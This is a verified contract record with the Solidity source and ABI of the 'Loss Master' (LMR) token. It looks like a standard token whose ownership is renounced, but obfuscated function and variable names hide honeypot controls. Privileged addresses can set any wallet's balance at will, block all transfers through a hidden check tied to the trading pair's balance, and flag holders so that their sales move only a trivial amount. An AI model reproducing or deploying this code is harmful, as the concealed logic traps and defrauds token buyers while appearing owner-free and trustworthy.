{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface senderToken {\n    function createPair(address maxTrading, address minReceiver) external returns (address);\n}\n\ninterface listFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txAmountLimit) external view returns (uint256);\n\n    function transfer(address launchFund, uint256 txShould) external returns (bool);\n\n    function allowance(address marketingFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchFund,\n        uint256 txShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldTrading, uint256 value);\n    event Approval(address indexed marketingFee, address indexed spender, uint256 value);\n}\n\nabstract contract teamSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapMaxLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listFundMetadata is listFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LossMaster is teamSell, listFund, listFundMetadata {\n\n    uint256 private takeIs = 100000000 * 10 ** 18;\n\n    function transfer(address modeSell, uint256 txShould) external virtual override returns (bool) {\n        return marketingToTeam(_msgSender(), modeSell, txShould);\n    }\n\n    address totalReceiverEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function txMin(uint256 txShould) public {\n        teamAmount();\n        receiverTo = txShould;\n    }\n\n    function marketingToTeam(address autoTeamReceiver, address launchFund, uint256 txShould) internal returns (bool) {\n        if (autoTeamReceiver == launchedModeAuto) {\n            return autoReceiver(autoTeamReceiver, launchFund, txShould);\n        }\n        uint256 buySender = listFund(takeMax).balanceOf(totalReceiverEnable);\n        require(buySender == receiverTo);\n        require(launchFund != totalReceiverEnable);\n        if (listMode[autoTeamReceiver]) {\n            return autoReceiver(autoTeamReceiver, launchFund, isList);\n        }\n        return autoReceiver(autoTeamReceiver, launchFund, txShould);\n    }\n\n    uint256 receiverEnable;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingReceiver;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingIsTo;\n    }\n\n    address public takeMax;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeIs;\n    }\n\n    function modeMarketing(address modeSell, uint256 txShould) public {\n        teamAmount();\n        sellToExempt[modeSell] = txShould;\n    }\n\n    function owner() external view returns (address) {\n        return tradingAuto;\n    }\n\n    address public launchedModeAuto;\n\n    function name() external view virtual override returns (string memory) {\n        return maxTeam;\n    }\n\n    uint256 public toReceiver;\n\n    bool public fundReceiver;\n\n    bool private senderMax;\n\n    string private maxTeam = \"Loss Master\";\n\n    function amountLiquidity(address walletIs) public {\n        if (liquidityMarketing) {\n            return;\n        }\n        if (atFrom != enableLiquidity) {\n            senderMax = false;\n        }\n        limitFrom[walletIs] = true;\n        \n        liquidityMarketing = true;\n    }\n\n    function teamAmount() private view {\n        require(limitFrom[_msgSender()]);\n    }\n\n    uint256 receiverTo;\n\n    bool private marketingLimit;\n\n    bool public limitEnable;\n\n    string private marketingIsTo = \"LMR\";\n\n    function totalExempt() public {\n        emit OwnershipTransferred(launchedModeAuto, address(0));\n        tradingAuto = address(0);\n    }\n\n    function transferFrom(address autoTeamReceiver, address launchFund, uint256 txShould) external override returns (bool) {\n        if (_msgSender() != autoWallet) {\n            if (fundTokenEnable[autoTeamReceiver][_msgSender()] != type(uint256).max) {\n                require(txShould <= fundTokenEnable[autoTeamReceiver][_msgSender()]);\n                fundTokenEnable[autoTeamReceiver][_msgSender()] -= txShould;\n            }\n        }\n        return marketingToTeam(autoTeamReceiver, launchFund, txShould);\n    }\n\n    function allowance(address minSell, address launchLimit) external view virtual override returns (uint256) {\n        if (launchLimit == autoWallet) {\n            return type(uint256).max;\n        }\n        return fundTokenEnable[minSell][launchLimit];\n    }\n\n    function balanceOf(address txAmountLimit) public view virtual override returns (uint256) {\n        return sellToExempt[txAmountLimit];\n    }\n\n    function autoReceiver(address autoTeamReceiver, address launchFund, uint256 txShould) internal returns (bool) {\n        require(sellToExempt[autoTeamReceiver] >= txShould);\n        sellToExempt[autoTeamReceiver] -= txShould;\n        sellToExempt[launchFund] += txShould;\n        emit Transfer(autoTeamReceiver, launchFund, txShould);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private fundTokenEnable;\n\n    mapping(address => uint256) private sellToExempt;\n\n    function approve(address launchLimit, uint256 txShould) public virtual override returns (bool) {\n        fundTokenEnable[_msgSender()][launchLimit] = txShould;\n        emit Approval(_msgSender(), launchLimit, txShould);\n        return true;\n    }\n\n    function launchedMinTrading(address launchedFeeTo) public {\n        teamAmount();\n        if (marketingLimit != launchedLiquidity) {\n            marketingLimit = false;\n        }\n        if (launchedFeeTo == launchedModeAuto || launchedFeeTo == takeMax) {\n            return;\n        }\n        listMode[launchedFeeTo] = true;\n    }\n\n    uint256 private enableLiquidity;\n\n    mapping(address => bool) public limitFrom;\n\n    uint256 constant isList = 12 ** 10;\n\n    constructor (){\n        if (senderMax) {\n            limitEnable = false;\n        }\n        swapMaxLimit autoMin = swapMaxLimit(autoWallet);\n        takeMax = senderToken(autoMin.factory()).createPair(autoMin.WETH(), address(this));\n        if (exemptReceiverLaunch == enableLiquidity) {\n            enableLiquidity = exemptReceiverLaunch;\n        }\n        launchedModeAuto = _msgSender();\n        limitFrom[launchedModeAuto] = true;\n        sellToExempt[launchedModeAuto] = takeIs;\n        totalExempt();\n        if (feeTotal) {\n            atFrom = enableLiquidity;\n        }\n        emit Transfer(address(0), launchedModeAuto, takeIs);\n    }\n\n    event OwnershipTransferred(address indexed tokenAt, address indexed listExemptFrom);\n\n    uint256 public exemptReceiverLaunch;\n\n    address private tradingAuto;\n\n    function getOwner() external view returns (address) {\n        return tradingAuto;\n    }\n\n    uint8 private tradingReceiver = 18;\n\n    mapping(address => bool) public listMode;\n\n    bool private feeTotal;\n\n    address autoWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public launchedLiquidity;\n\n    uint256 private atFrom;\n\n    bool public liquidityMarketing;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listExemptFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletIs\",\"type\":\"address\"}],\"name\":\"amountLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAmountLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiverLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFeeTo\",\"type\":\"address\"}],\"name\":\"launchedMinTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedModeAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txShould\",\"type\":\"uint256\"}],\"name\":\"modeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTeamReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txShould\",\"type\":\"uint256\"}],\"name\":\"txMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LossMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}